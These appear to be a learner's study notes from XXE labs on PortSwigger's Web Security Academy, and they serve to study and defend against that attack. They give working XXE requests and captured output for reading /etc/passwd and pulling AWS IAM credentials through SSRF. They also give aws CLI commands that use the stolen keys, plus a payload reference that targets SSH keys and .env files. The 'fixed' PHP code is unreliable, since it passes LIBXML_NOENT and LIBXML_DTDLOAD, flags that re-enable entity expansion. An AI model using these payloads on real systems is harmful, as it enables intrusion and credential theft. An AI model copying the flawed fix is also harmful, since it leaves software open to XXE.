# Day 35 Notes — XXE (XML External Entity Injection)

---

## 1. What We Did Today Overview

- Completed Lab 1: Basic XXE file read — successfully read `/etc/passwd` from the server using an external entity in the XML body
- Completed Lab 2: XXE to SSRF — successfully fetched AWS IAM credentials from the internal metadata endpoint (`169.254.169.254`) using XXE as the SSRF vector
- Studied Lab 3: Blind XXE with out-of-band interaction — understood the mechanism fully even without Burp Pro Collaborator access
- Analysed the vulnerable PHP source code line by line and understood the exact fix
- Built the complete XXE → SSRF → Cloud Credential Theft chain
- Zero hints used across both labs

---

## 2. The Foundation — Why XXE Exists

### Part A — Root Cause

Developers build features that accept XML input — file uploads, API endpoints, document processors. XML has a feature called **external entities** — a way to reference content from outside the document using the `SYSTEM` keyword. The developer enables XML parsing without disabling this feature because they don't know it's dangerous by default.

When an attacker submits XML containing an external entity reference, the XML parser **faithfully fetches** whatever the entity points to — including files on the server's filesystem (`file:///etc/passwd`) or internal network URLs (`http://169.254.169.254/`).

**The developer's mistake:** enabling XML parsing without explicitly disabling external entity resolution in the parser configuration.

### Part B — Real World Analogy

You give someone a form to fill in. The form has a field that says "write the filename here and we'll attach it." You intended this for your own supplementary documents. But an attacker writes `/etc/passwd` — and your form faithfully attaches the server's password file to the submission. You built a legitimate feature without realising it could be pointed at sensitive files.

### Part C — Three Conditions Required

1. The application accepts XML input somewhere — file upload, API body, SOAP request
2. The XML parser has external entity processing **enabled** — the default in many parsers
3. The server has files or internal services the attacker wants to access

### Part D — What XXE Can and Cannot Do

**Can do:**
- Read arbitrary files from the server filesystem (`/etc/passwd`, config files, source code)
- Perform SSRF — make the server fetch internal URLs the attacker can't reach directly from the internet
- In some configurations — RCE via XXE chains
- Blind data exfiltration via out-of-band DNS/HTTP requests when no output is visible

**Cannot do:**
- Execute JavaScript in the victim's browser (that is XSS, not XXE)
- Modify data directly (though it can lead to it via chaining)
- Work if the XML parser has external entities explicitly disabled

### Part E — Real World Context

In 2014 an XXE vulnerability was found in **Facebook's career portal**. Researchers used it to read internal AWS credentials from the server. Facebook paid a significant bug bounty. PortSwigger rates XXE as **Critical** when it leads to file disclosure or SSRF. HackerOne payouts range from **$500 to $10,000** depending on impact.

---

## 3. Lab 1 — Basic XXE File Read

### Lab Name
Exploiting XXE using external entities to retrieve files

### The Setup

The application is a shopping site with a "Check stock" button. Clicking it sends an XML request body to `/product/stock`. Burp Intercept captured the raw XML body and we modified it in Repeater.

### The Exact Request Sent

```http
POST /product/stock HTTP/2
Host: 0a3100f8039e556980ad354b00c200e9.web-security-academy.net
Cookie: session=tSz9HGzguuV2LaJAniH0yOvwhYZ6fydD
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>
&xxe;</productId><storeId>2</storeId></stockCheck>
```

### The Exact Payload Used

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
```

**What the payload does line by line:**

- `<!DOCTYPE test [...]>` — Declares a DOCTYPE block. This is where XML entity definitions live.
- `<!ENTITY xxe SYSTEM "file:///etc/passwd">` — Defines an external entity named `xxe` that points to the server's local file `/etc/passwd`. The `SYSTEM` keyword means external source — a file path or URL.
- `&xxe;` — References the entity inside the `productId` field. When the parser hits this, it fetches the file and substitutes its contents here.

### The Exact Output Received

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
Content-Length: 2339

"Invalid product ID: 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,"
```

### Why It Worked — Original Code vs Injected Version

**What the server expected to receive (normal request):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>2</storeId>
</stockCheck>
```

**What we sent (injected request):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>2</storeId>
</stockCheck>
```

**What happened inside the parser:**

1. Parser reads DOCTYPE declaration — registers entity named `xxe` pointing to `file:///etc/passwd`
2. Parser reaches `&xxe;` inside `<productId>` — fetches `/etc/passwd` from the local filesystem
3. Parser substitutes file contents into the field — `productId` now contains the full passwd file
4. Application tries to look up product ID using that value — fails
5. Error message returns the invalid product ID value — which is the full contents of `/etc/passwd`
6. We read the server's password file from the error response

### What This Proves

- The XML parser is processing external entities without restriction
- The application accepts XML from user input without sanitising the DOCTYPE
- Arbitrary files readable by the web server process (`www-data`) are accessible to an unauthenticated attacker
- The error message becomes an accidental data exfiltration channel

---

## 4. Lab 2 — XXE to SSRF

### Lab Name
Exploiting XXE to perform SSRF attacks

### The Exact Request Sent

```http
POST /product/stock HTTP/2
Host: 0afa00f304fbc76d8075353e00f500f7.web-security-academy.net
Cookie: session=L1cORqcHu91VUnCsSy8XDhjSMEGXQg45
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### The Exact Payload Used

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

**What changed from Lab 1:**
The `SYSTEM` value changed from `file:///etc/passwd` (local file) to `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin` (internal HTTP URL). The parser fetches URLs just as willingly as files — the mechanism is identical.

### The Exact Output Received

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
Content-Length: 552

"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2026-06-08T06:46:35.401882021Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "rxdE7Tj7NIf0pjPPUmeq",
  "SecretAccessKey" : "D1yfwTNY2QlZjrCxcmsvZ7tZupcNcrE0ACqQp46R",
  "Token" : "FCQsduVDP2XPPFIX3ujqKMylnAhfZVs8SFCC8zLOCTozkmbkRStXgg24FyLp6cR0nfOpnuNpCjx4OjPYzqquuPPdOBHffqRWuxHnirhgIKBnJ5RpEmqZgeueypA4pEczQWWjiYwZIcZ5u9DD6Nfm8BvlHEYOix6YqDrjLbHe7DcIUVxLloqkoKojNzGoG1HpNwYMs4dRil5BcKZWaJ0O4ibiQ1ZdJhq0Y0aFDeN1toHfzlp1CK3SNHkn5vrdxOrr",
  "Expiration" : "2032-06-06T06:46:35.401882021Z"
}"
```

### Why This is Critical in Cloud Environments

The AWS metadata endpoint at `169.254.169.254` is only accessible from within the cloud instance itself — it is a link-local address unreachable from the public internet. An attacker sitting outside the server cannot reach it directly. But when XXE is present, the attacker makes the **server** fetch it — the server is inside the network, so it can reach the endpoint.

What these credentials provide:

- `AccessKeyId` + `SecretAccessKey` + `Token` = full AWS temporary credentials
- These can be configured in the AWS CLI: `aws configure`
- With these credentials the attacker can access everything the IAM role has permissions to access
- S3 buckets: `aws s3 ls` then `aws s3 cp s3://bucket/secret.csv .`
- EC2 instances, RDS databases, Lambda functions, CloudWatch logs — everything the role touches
- A single XXE finding on a cloud-hosted application becomes full infrastructure compromise

**Severity upgrade from Lab 1 to Lab 2:**
- Lab 1 (file read) → High — limited to files readable by `www-data`
- Lab 2 (SSRF + cloud credentials) → Critical — full AWS account access

---

## 5. Lab 3 — Blind XXE with Out-of-Band Interaction

### Why Blind XXE Exists

Many real-world applications don't return XML processing errors to the user. Error messages are suppressed. The entity gets fetched internally but nothing appears in the HTTP response. This is blind XXE — you can't see the output directly.

### What Burp Collaborator Does

Burp Collaborator is a server that Burp Suite hosts. When you generate a Collaborator URL (e.g. `abc123.burpcollaborator.net`), that URL is unique to you. When any server on the internet makes a DNS lookup or HTTP request to that URL, Burp records it.

In blind XXE testing:
- You point the external entity at your Collaborator URL instead of a file
- You send the payload to the target
- If the target's XML parser fetches the URL — the request shows up in Collaborator
- This proves XXE exists even though the HTTP response showed nothing

### The Payload (for reference — requires Burp Pro Collaborator)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-URL.burpcollaborator.net">]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

### Step by Step — What Would Happen with Burp Pro

1. Open Burp → top menu → **Burp** → **Burp Collaborator client**
2. Click **Copy to clipboard** — you get a unique subdomain URL
3. Replace `YOUR-COLLABORATOR-URL` in the payload above with your copied URL
4. Send the payload in Repeater
5. Switch to Collaborator client → click **Poll now**
6. Two entries would appear:
   - **DNS lookup** from the target server — the server resolved your Collaborator domain to an IP address
   - **HTTP request** from the target server — the server made an HTTP GET to your URL

### What Collaborator Would Show

```
DNS Query from [target-server-IP] for abc123.burpcollaborator.net
HTTP Request from [target-server-IP]:
  GET / HTTP/1.1
  Host: abc123.burpcollaborator.net
```

### Why Blind XXE Still Matters Without Visible Output

In real bug bounty programs the target might:
- Suppress all error messages — no error leaks file contents
- Return generic 500 pages — no useful information
- Log errors internally but not expose them

Without out-of-band detection you would conclude "no XXE" and move on. You would be wrong. The DNS interaction from Collaborator proves the parser is processing external entities and making outbound network connections — that is sufficient to file a High/Critical report with a clear proof of concept.

### Alternative When Collaborator is Unavailable (Community Edition)

- Use `http://127.0.0.1/` and check if response time increases — a slow response means the server tried to connect
- Use a free alternative like `interactsh` — an open source out-of-band interaction tool: `https://github.com/projectdiscovery/interactsh`
- Check if the response body changes at all — even a different error message can confirm server-side processing

---

## 6. Vulnerable Source Code — Line by Line

```php
// Vulnerable PHP XML parsing
$xml = file_get_contents('php://input');
$doc = new DOMDocument();
$doc->loadXML($xml);
$productId = $doc->getElementsByTagName('productId')[0]->nodeValue;
```

**`$xml = file_get_contents('php://input')`**
Reads the raw HTTP request body. `php://input` is a stream that gives access to the raw POST data. The attacker controls this completely — they sent the entire XML including the DOCTYPE declaration and entity reference. Nothing has been sanitised yet.

**`$doc = new DOMDocument()`**
Creates a new XML DOM parser object. No vulnerability yet — just instantiation.

**`$doc->loadXML($xml)`**
This is the vulnerability. PHP's `DOMDocument::loadXML()` enables external entity processing by default. When the method parses the XML it sees the DOCTYPE declaration, registers the `xxe` entity, and because external entity processing is on, it fetches the `SYSTEM` resource — whether that is `file:///etc/passwd` or `http://169.254.169.254/`. This happens silently inside the parser before the application code even runs.

**`$productId = $doc->getElementsByTagName('productId')[0]->nodeValue`**
Reads the value of the first `<productId>` element. But the parser already substituted the entity — so `nodeValue` is now the full contents of `/etc/passwd` or the AWS credentials JSON. The application then tries to use this as a product ID, fails, and returns it in the error message.

---

## 7. What Failed and Why

Nothing failed today. Both labs were solved in a single attempt without hints.

**Observation from Lab 2:** The first payload sent was already the deep path `iam/security-credentials/admin` — skipping the step of first fetching the directory listing. This worked because the role name was known to be `admin` in the lab environment. In a real target the correct approach is to first fetch `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to get the role name, then fetch the credentials for that specific role.

---

## 8. The Fix — Vulnerable Code, Fixed Code, Why It Works

### Vulnerable Pattern

```php
$doc = new DOMDocument();
$doc->loadXML($xml);  // External entities enabled by default — DANGEROUS
```

### Fixed Code

```php
$doc = new DOMDocument();

// Disable external entity loading before parsing
libxml_disable_entity_loader(true);

$doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
```

**Why the fix works:** `libxml_disable_entity_loader(true)` is a global flag that tells the underlying libxml2 library to never load external resources. When the parser encounters `SYSTEM "file:///etc/passwd"` it registers the entity name but never fetches the resource. The `&xxe;` reference resolves to an empty string or throws a controlled error — the file is never read.

### Defense in Depth

1. **Disable external entities** — `libxml_disable_entity_loader(true)` in PHP, `XMLConstants.FEATURE_SECURE_PROCESSING` in Java, `resolve_entities: false` in Python's lxml
2. **Reject DOCTYPE declarations entirely** — if the application doesn't need custom entities, block any XML containing `<!DOCTYPE` before it reaches the parser
3. **Least privilege** — run the web server process as a user with minimal filesystem access so even if XXE fires it can't read sensitive files
4. **Use JSON instead of XML** — JSON has no concept of entities or external references; if the API doesn't need XML there is no XML attack surface

### What Does NOT Fix XXE

- Input validation on the final extracted value — too late, the entity was already resolved by the parser before your validation runs
- Blocking `<` and `>` in URL parameters — XXE lives in the request body, not URL parameters
- HTTPS/TLS — encryption has nothing to do with what the parser does with the content after decryption
- WAF blocking the word "passwd" in the response — the exfiltration already happened; blocking the response doesn't stop the read

---

## 9. Chain Thinking — XXE + SSRF + Cloud Credentials

### Full Attack Chain

```
Target: Cloud-hosted application with XML-accepting endpoint
        ↓
Step 1: Find XML input
Identify any endpoint with Content-Type: application/xml in requests
File uploads, API bodies, SOAP endpoints, stock checkers
        ↓
Step 2: Confirm file read XXE
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
Response: root:x:0:0:root:/root:/bin/bash ... → confirmed
        ↓
Step 3: Confirm SSRF via XXE
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>
Response: directory listing of metadata paths → SSRF confirmed
        ↓
Step 4: Get IAM role name
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
Response: "admin" → role name is admin
        ↓
Step 5: Get credentials for the role
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
Response: AccessKeyId + SecretAccessKey + Token → full credentials
        ↓
Step 6: Use credentials
aws configure --profile stolen
AWS Access Key ID: rxdE7Tj7NIf0pjPPUmeq
AWS Secret Access Key: D1yfwTNY2QlZjrCxcmsvZ7tZupcNcrE0ACqQp46R
        ↓
Step 7: Enumerate what the role can access
aws s3 ls --profile stolen
aws iam get-role --role-name admin --profile stolen
        ↓
Step 8: Extract data
aws s3 cp s3://bucket-name/sensitive-data.csv . --profile stolen
        ↓
Full AWS infrastructure access from a single XXE vulnerability
```

### Severity Upgrade Table

| Stage | Vulnerability | Severity | Impact |
|---|---|---|---|
| Stage 1 | XXE file read | High | Read files accessible to `www-data` |
| Stage 2 | XXE + SSRF | Critical | Access internal services and metadata |
| Stage 3 | XXE + SSRF + IAM credentials | Critical + | Full AWS account access |
| Stage 4 | AWS access + S3/RDS | Critical + | All data across infrastructure |

---

## 10. Real World Context

**Facebook 2014:** XXE found in the career portal allowed researchers to read internal AWS credentials. This is exactly the chain demonstrated in Lab 2 today — the same endpoint, the same metadata service, the same credential format.

**Why this still appears in 2026:** Many legacy enterprise applications use SOAP (XML-based APIs) and old XML parsing libraries with external entities enabled by default. Internal tools, file processing services, and document converters are common targets. Applications that process uploaded XML files (XLSX files are actually ZIP archives containing XML, DOCX files contain XML internally) are also vulnerable if the XML parser is misconfigured.

**Bug bounty approach:**
- Target: any application with file upload, XML API, or SOAP endpoint
- First check: does `Content-Type: application/xml` appear in any request?
- If yes: intercept, inject basic entity, check response
- If blind: set up Collaborator or interactsh, send OOB payload, check for DNS interaction
- Report severity: Critical if cloud credentials achievable, High if file read only

---

## 11. Key Concepts Summary

| Term | Meaning |
|---|---|
| XML Entity | A shortcut/variable in XML — `&name;` gets replaced with its defined value |
| External Entity | An entity that references a file or URL using the `SYSTEM` keyword |
| DOCTYPE | XML declaration block where entities are defined |
| XXE | When a user controls the XML and injects their own external entity definitions |
| SSRF via XXE | Using the external entity mechanism to make the server fetch internal HTTP URLs |
| Blind XXE | XXE where the fetched content is not returned in the HTTP response |
| Out-of-band | Sending data to an attacker-controlled server via DNS/HTTP instead of the direct response |
| Burp Collaborator | Burp's server for receiving and logging out-of-band DNS and HTTP interactions |
| AWS link-local | `169.254.169.254` — internal AWS metadata endpoint, unreachable from the internet |
| IAM credentials | AWS identity keys — `AccessKeyId` + `SecretAccessKey` + `Token` |
| libxml_disable_entity_loader | PHP function that disables external entity resolution globally |

---

## 12. Payloads Reference

### Basic XXE — File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### XXE — SSRF Metadata Directory Listing

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### XXE — SSRF IAM Role Name

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### XXE — SSRF IAM Credentials (replace ROLE-NAME)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### Blind XXE — Out-of-Band via Collaborator (replace YOUR-COLLABORATOR-URL)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-URL.burpcollaborator.net">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

### Other Files Worth Reading via XXE

```xml
<!-- Linux SSH private key -->
<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">

<!-- Application config (common paths) -->
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
<!ENTITY xxe SYSTEM "file:///app/config.py">
<!ENTITY xxe SYSTEM "file:///app/.env">

<!-- Web server config -->
<!ENTITY xxe SYSTEM "file:///etc/nginx/nginx.conf">
<!ENTITY xxe SYSTEM "file:///etc/apache2/apache2.conf">
```

---

## 13. Foundation Checklist

1. **What is the developer mistake that causes XXE?**
   The developer enables XML parsing without calling `libxml_disable_entity_loader(true)` or equivalent. The XML parser processes DOCTYPE declarations and resolves `SYSTEM` entity references by default — fetching files and URLs the attacker specifies.

2. **What is the difference between basic XXE and blind XXE?**
   In basic XXE the fetched content appears in the HTTP response — directly in an error message or response body. In blind XXE the parser fetches the resource internally but the response shows nothing. The only way to detect blind XXE is out-of-band — making the server send a DNS lookup or HTTP request to an attacker-controlled server.

3. **Why does XXE + SSRF on a cloud server escalate to Critical severity?**
   Because `169.254.169.254` is only reachable from within the cloud instance itself — it is a link-local address. An attacker on the internet cannot reach it. But XXE makes the server fetch it internally — the server acts as a proxy. The metadata endpoint returns IAM credentials, giving the attacker full AWS API access using the keys.

4. **What single line of PHP code fixes XXE and why does it work?**
   `libxml_disable_entity_loader(true)` — this flag tells the underlying libxml2 library to never load external resources. Entity names are still registered during DOCTYPE parsing but the `SYSTEM` fetch never executes. `&xxe;` resolves to nothing instead of file contents.

5. **If an application doesn't reflect any output, how do you still prove XXE exists?**
   Use out-of-band detection. Point the external entity at a Burp Collaborator URL or an interactsh endpoint you control. If the target server's XML parser processes the entity it will make a DNS lookup and HTTP request to your server. The interaction appearing in Collaborator proves the parser executed the external entity fetch — that is sufficient proof of concept for a report.

6. **What does the `/etc/passwd` output from Lab 1 tell you beyond just proving file read?**
   It reveals all usernames and their home directories (`peter`, `carlos`, `user`, `elmer`, `academy` with `/bin/bash` shells — meaning they are real interactive accounts). It shows the web server runs as `www-data`. It tells you what users exist for password attacks or privilege escalation paths. It confirms the OS is Linux. It gives you home directory paths to target for SSH keys (`/home/peter/.ssh/id_rsa`).

---
